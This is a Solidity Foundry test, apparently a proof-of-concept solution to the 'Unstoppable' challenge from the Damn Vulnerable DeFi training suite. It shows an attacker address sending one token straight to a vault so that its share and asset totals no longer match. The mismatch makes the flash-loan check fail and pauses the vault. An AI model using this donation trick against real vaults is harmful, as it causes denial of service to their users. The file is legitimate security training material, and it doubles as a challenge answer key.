//SPDX-License-Identifier: UNLICENSED
//fast link = forge test --match-path test/POC/unstoppable.t.sol -vvvv

pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import "../../src/unstoppable/UnstoppableMonitor.sol";
import "../../src/unstoppable/UnstoppableVault.sol";
import "../../src/DamnValuableToken.sol";

contract UnstoppablePOC is Test {
    DamnValuableToken token;
    UnstoppableMonitor monitor;
    UnstoppableVault vault;

    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(deployer);

        token = new DamnValuableToken();
        vault = new UnstoppableVault(token, deployer, deployer);
        monitor = new UnstoppableMonitor(address(vault));
        vault.transferOwnership(address(monitor));

        token.approve(address(vault), type(uint256).max);
        vault.deposit(1_000_000e18, deployer);
        token.transfer(attacker, 10e18);
        vm.stopPrank();
    }
    function test_exploit() public {
        //checking two total are correlated
        // doing transfer ERC20 to crash the correlaion between two totals
        vm.startPrank(attacker);
        token.transfer(address(vault), 1);
        vm.stopPrank();
        //checking if both totals are now mismatching
        assertTrue(vault.totalSupply() != vault.totalAssets());
        //checking if flashloan is allowed
        vm.prank(deployer);
        monitor.checkFlashLoan(100e18);
        //being sure that vault is paused
        assertTrue(vault.paused());
    }
}
